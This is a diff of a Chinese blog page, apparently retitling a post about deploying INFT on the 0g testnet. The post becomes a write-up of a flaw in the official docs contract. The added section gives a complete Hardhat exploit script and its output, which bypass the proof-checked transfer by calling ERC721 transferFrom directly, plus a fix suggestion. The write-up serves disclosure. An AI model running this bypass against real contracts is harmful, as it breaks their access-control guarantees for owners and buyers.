@@ -14,7 +14,7 @@
   
 
   
-  <title>如何在0g上部署INFT(测试网)</title>
+  <title>0g官方docs合约漏洞</title>
 
   
   
@@ -117,13 +117,13 @@
 
 <header>
   <p class="meta">Dec 15, 2025
-     - 10 minute read 
-     - <a href="https://Frederick2313072.github.io/blog/2025-12-15-%E5%A6%82%E4%BD%95%E5%9C%A80g%E4%B8%8A%E9%83%A8%E7%BD%B2inft%E6%B5%8B%E8%AF%95%E7%BD%91/#disqus_thread">Comments</a>
+     - 12 minute read 
+     - <a href="https://Frederick2313072.github.io/blog/2025-12-15-0g%E5%AE%98%E6%96%B9docs%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E/#disqus_thread">Comments</a>
 
     
   </p>
   <h1 class="entry-title">
-     如何在0g上部署INFT(测试网) 
+     0g官方docs合约漏洞 
   </h1>
 </header>
 
@@ -262,8 +262,120 @@
 <p><strong>留后门</strong>继承了 <code>ERC721</code>意味着它自动拥有了 <code>transferFrom</code> 和 <code>safeTransferFrom</code> 这两个标准转账函数。</p>
 <p><strong>问题</strong>: 如果用户<strong>绕过</strong>自定义的 <code>transfer</code> 函数，直接调用标准的 <code>ERC721.transferFrom</code>，会发生什么？</p>
 <p>NFT 会被成功转账，<strong>但是数据权限不会更新</strong>！</p>
-<p><strong>修复建议</strong>: 如果这是一个严格的隐私 NFT，你应该override标准的 <code>transferFrom</code> 函数，要么禁用它，要么强制要求它也必须携带 Proof，但是这会破坏 ERC721 兼容性</p>
-<p>metadatamanager.js</p>
+<p><strong>修复建议</strong>:override标准的 <code>transferFrom</code> 函数，要么禁用它，要么强制要求它也必须携带 Proof，但是这会破坏 ERC721 兼容性</p>
+<p>一个攻击脚本</p>
+<p>有两个不同账号，deployer和attacker，攻击者应该是owner，毕竟他希望把metadata留在自己手中</p>
+<p>第一步，铸造一个nft给deploer，为了演示，需要确保至少有一个token，这里简化，假设token id 1 已经属于deployer，如果没，mint 1个，这里有个假设，token id是递增的，但是不影响，直接硬编码，或者便利找到一个owner是deployer的token（这里仅作演示，1-100遍历），第二步检查metadata是否存在，第三步，执行攻击，绕过INFT.transfer，直接调用erc721的transferFrom，因为是owner，deployer 自己转给自己不需要 approve，转给别人也不需要，</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>const txBypass <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> contract<span style="color:#719e07">.</span>transferFrom(
+</span></span><span style="display:flex;"><span>            deployer<span style="color:#719e07">.</span>address,
+</span></span><span style="display:flex;"><span>            attacker<span style="color:#719e07">.</span>address,
+</span></span><span style="display:flex;"><span>            targetTokenId
+</span></span><span style="display:flex;"><span>        );
+</span></span></code></pre></div><p>这段代码如果执行成功，那么就是没有proof直接transfer了</p>
+<p>验证是否newOwner === attacker.address</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tsx" data-lang="tsx"><span style="display:flex;"><span><span style="color:#586e75">// scripts/exploit_bypass.ts
+</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span><span style="color:#268bd2">import</span> { ethers } <span style="color:#268bd2">from</span> <span style="color:#2aa198">&#34;hardhat&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">async</span> <span style="color:#268bd2">function</span> main() {
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> INFT_ADDRESS <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;0x074D5F95eC6E8Da11fa80EBcf8211661b9a60144&#34;</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> [deployer] <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> ethers.getSigners();
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> attacker <span style="color:#719e07">=</span> ethers.Wallet.createRandom().connect(ethers.provider);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;Original Owner:&#34;</span>, deployer.address);
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;Attacker/Receiver:&#34;</span>, attacker.address);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> INFT <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> ethers.getContractFactory(<span style="color:#2aa198">&#34;INFT&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> contract <span style="color:#719e07">=</span> INFT.attach(INFT_ADDRESS);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;\n--- Setup: Minting a fresh NFT ---&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> txMint <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> (contract <span style="color:#268bd2">as</span> <span style="color:#dc322f">any</span>).mint(
+</span></span><span style="display:flex;"><span>        deployer.address,
+</span></span><span style="display:flex;"><span>        <span style="color:#2aa198">&#34;og://test-uri-bypass&#34;</span>,
+</span></span><span style="display:flex;"><span>        ethers.keccak256(ethers.toUtf8Bytes(<span style="color:#2aa198">&#34;test-metadata&#34;</span>))
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> receipt <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> txMint.wait();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> balance <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> contract.balanceOf(deployer.address);
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">let</span> targetTokenId <span style="color:#719e07">=</span> <span style="color:#719e07">-</span><span style="color:#2aa198">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">for</span> (<span style="color:#268bd2">let</span> i <span style="color:#719e07">=</span> <span style="color:#2aa198">1</span>; i <span style="color:#719e07">&lt;</span> <span style="color:#2aa198">100</span>; i<span style="color:#719e07">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#719e07">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#268bd2">const</span> owner <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> contract.ownerOf(i);
+</span></span><span style="display:flex;"><span>            <span style="color:#719e07">if</span> (owner <span style="color:#719e07">===</span> deployer.address) {
+</span></span><span style="display:flex;"><span>                targetTokenId <span style="color:#719e07">=</span> i;
+</span></span><span style="display:flex;"><span>                <span style="color:#719e07">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#719e07">catch</span> (e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#719e07">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">if</span> (targetTokenId <span style="color:#719e07">===</span> <span style="color:#719e07">-</span><span style="color:#2aa198">1</span>) {
+</span></span><span style="display:flex;"><span>        console.error(<span style="color:#2aa198">&#34;No token found for deployer. Please mint one first.&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#719e07">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#586e75">`Target Token ID: </span><span style="color:#2aa198">${</span>targetTokenId<span style="color:#2aa198">}</span><span style="color:#586e75">`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;\n--- Before Exploit ---&#34;</span>);
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;Owner:&#34;</span>, <span style="color:#719e07">await</span> contract.ownerOf(targetTokenId));
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> uriBefore <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> (contract <span style="color:#268bd2">as</span> <span style="color:#dc322f">any</span>).getEncryptedURI(targetTokenId);
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;Encrypted URI:&#34;</span>, uriBefore);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;\n--- Executing Bypass Attack (transferFrom) ---&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">const</span> txBypass <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> contract.transferFrom(
+</span></span><span style="display:flex;"><span>            deployer.address,
+</span></span><span style="display:flex;"><span>            attacker.address,
+</span></span><span style="display:flex;"><span>            targetTokenId
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;Transaction sent:&#34;</span>, txBypass.hash);
+</span></span><span style="display:flex;"><span>        <span style="color:#719e07">await</span> txBypass.wait();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;✅ Attack Successful: transferFrom executed without proof!&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#719e07">catch</span> (error) {
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;❌ Attack Failed: Transaction reverted (This is GOOD if fixed, BAD if vulnerable)&#34;</span>);
+</span></span><span style="display:flex;"><span>        console.error(error);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;\n--- After Exploit ---&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">const</span> newOwner <span style="color:#719e07">=</span> <span style="color:#719e07">await</span> contract.ownerOf(targetTokenId);
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#2aa198">&#34;New Owner:&#34;</span>, newOwner);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#719e07">if</span> (newOwner <span style="color:#719e07">===</span> attacker.address) {
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;\n  VULNERABILITY CONFIRMED &#34;</span>);
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;The NFT was transferred using standard ERC721 methods.&#34;</span>);
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;However, NO Oracle verification was performed, and NO Key was re-encrypted/transferred.&#34;</span>);
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;The new owner holds the NFT but cannot access the data!&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#719e07">else</span> {
+</span></span><span style="display:flex;"><span>        console.log(<span style="color:#2aa198">&#34;\n System Secure: Transfer was blocked.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main().<span style="color:#719e07">catch</span>((error) <span style="color:#719e07">=&gt;</span> {
+</span></span><span style="display:flex;"><span>    console.error(error);
+</span></span><span style="display:flex;"><span>    process.exitCode <span style="color:#719e07">=</span> <span style="color:#2aa198">1</span>;
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>最后结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">---</span> Setup: Minting a fresh NFT <span style="color:#719e07">---</span>
+</span></span><span style="display:flex;"><span>Target Token ID: <span style="color:#2aa198">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">---</span> Before Exploit <span style="color:#719e07">---</span>
+</span></span><span style="display:flex;"><span>Owner: <span style="color:#2aa198">0xA6f3dfa42680C2221752552Ecb3872E44f4F7ACC</span>
+</span></span><span style="display:flex;"><span>Encrypted URI: og:<span style="color:#719e07">//</span>ea7dbb087934fa01d7d1c592f2d36a9ff6b0254bcd71bf37ea74c0485eb7bb8e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">---</span> Executing Bypass Attack (transferFrom) <span style="color:#719e07">---</span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#2aa198">0x23669efc727e7b2d829077caa86fce769f4007c83f0aedf780163f83810e138c</span>
+</span></span><span style="display:flex;"><span>Attack Successful: transferFrom executed without proof!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">---</span> After Exploit <span style="color:#719e07">---</span>
+</span></span><span style="display:flex;"><span>New Owner: <span style="color:#2aa198">0x3Edd2422BA276050765a7Ce3601119E2ae5F1CD9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>VULNERABILITY CONFIRMED
+</span></span><span style="display:flex;"><span>The NFT was transferred using standard ERC721 methods<span style="color:#719e07">.</span>
+</span></span><span style="display:flex;"><span>However, NO Oracle verification was performed, <span style="color:#719e07">and</span> NO Key was re<span style="color:#719e07">-</span>encrypted<span style="color:#719e07">/</span>transferred<span style="color:#719e07">.</span>
+</span></span><span style="display:flex;"><span>The new owner holds the NFT but cannot access the data!
+</span></span></code></pre></div><p>metadatamanager.js</p>
 <p>在数据上链之前，在本地或服务器端完成<strong>加密</strong>、<strong>上传</strong>和<strong>打包</strong>工作。</p>
 <p>一些接口：</p>
 <p><strong><code>OGStorage</code></strong>: 定义了存储层的标准。不管底层用的是 IPFS 还是 0G Storage，只要能 <code>store</code> (存) 和 <code>retrieve</code> (取) 即可。</p>
@@ -915,11 +1027,11 @@ Click on
           
           
             
-          
-            
               <li class="post">
-                <a href="../../blog/2025-12-15-%E5%A6%82%E4%BD%95%E5%9C%A80g%E4%B8%8A%E9%83%A8%E7%BD%B2inft%E6%B5%8B%E8%AF%95%E7%BD%91/">如何在0g上部署INFT(测试网)</a>
+                <a href="../../blog/2025-12-15-0g%E5%AE%98%E6%96%B9docs%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E/">0g官方docs合约漏洞</a>
               </li>
+            
+          
             
           
             
